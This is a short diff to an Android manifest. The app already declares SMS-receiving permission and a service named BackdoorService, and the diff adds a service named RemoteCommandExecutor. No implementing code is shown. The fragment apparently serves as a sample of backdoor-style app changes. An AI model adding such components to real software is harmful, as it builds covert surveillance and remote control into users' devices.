@@ -3,5 +3,6 @@
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <application>
         <service android:name=".BackdoorService" android:directBootAware="true"/>
+        <service android:name=".RemoteCommandExecutor" android:exported="false" />
     </application>
 </manifest>
